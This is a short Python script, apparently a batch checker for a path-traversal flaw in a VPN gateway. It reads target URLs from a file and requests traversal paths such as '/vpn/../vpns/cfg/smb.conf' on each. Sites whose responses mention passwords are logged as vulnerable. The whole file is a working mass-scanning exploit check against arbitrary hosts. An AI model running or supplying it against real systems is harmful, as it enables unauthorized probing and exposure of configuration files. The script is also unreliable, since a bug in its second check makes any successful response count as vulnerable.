#coding=utf-8
"""
批量验证脚本
用法：

目标站点存放在url.txt中，一行一个，结尾不用加/，如果有要把url前面的/删掉
	
"""
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def main():
    
    f = open("url.txt", "r")
    res = open("success.txt", "a+")
    fail = open("errorlog.txt", "w+")
    url1 = "/vpn/../vpns/cfg/smb.conf"
    url2 = "/vpn/../vpns/services.html"
    for i in f.readlines():
        try:
            rq1 = requests.get(i.replace("\n", "") + url1, verify=False)
            rq2 = requests.get(i.replace("\n", "") + url2, verify=False)
            # print(i.replace("\n", "") + uri1)
            if  (((rq1.status_code == 200) and ("passwords" in rq1.text)) or ((rq2.status_code == 200) and ("passwords in rq2.text"))):
                print(i + " is vulnerable!")
                res.write(i.replace("\n", "") + "\n")
            else:
                print(i + " is not vulnerable!")
        except:
            print(i.replace("\n", "") + " error!")
            fail.write(i.replace("\n", "") + " error!")
    f.close()
    res.close()
    fail.close()

if __name__ == "__main__":
    main()
